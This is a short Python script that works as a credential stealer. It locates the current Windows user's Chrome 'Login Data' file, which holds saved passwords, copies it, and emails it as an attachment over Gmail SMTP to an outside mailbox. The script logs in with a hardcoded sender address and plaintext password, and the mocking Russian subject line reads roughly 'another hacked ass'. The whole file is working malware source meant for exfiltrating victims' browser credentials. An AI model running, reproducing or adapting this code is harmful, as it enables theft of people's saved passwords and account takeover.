from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from shutil import copyfile
import smtplib
import socket
import os

# creating way to Login Data and copying this file to my directory
pc_name = os.environ.get( "USERNAME" )
data_way = r"C:\\users\\" + str(pc_name) + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
copyfile(data_way, "passwords")

addr_from =  "virus.zhopbl@gmail.com"
addr_to = "1234roqe@gmail.com"
password = "romaroma1239"
msg = MIMEMultipart()
msg["From"] = addr_from
msg["To"] = addr_to
msg["Subject"] = "еще одна взломанная жопа"

with open (data_way, "rb") as fp:
    file = MIMEBase("text", "markdown")
    file.set_payload(fp.read())
    fp.close()
encoders.encode_base64(file)
file.add_header('Content-desposition', 'attachment', filename="filename")
msg.attach(file)

server = smtplib.SMTP("smtp.gmail.com: 587")
server.starttls()
server.login(addr_from, password)
server.send_message(msg)
server.quit()

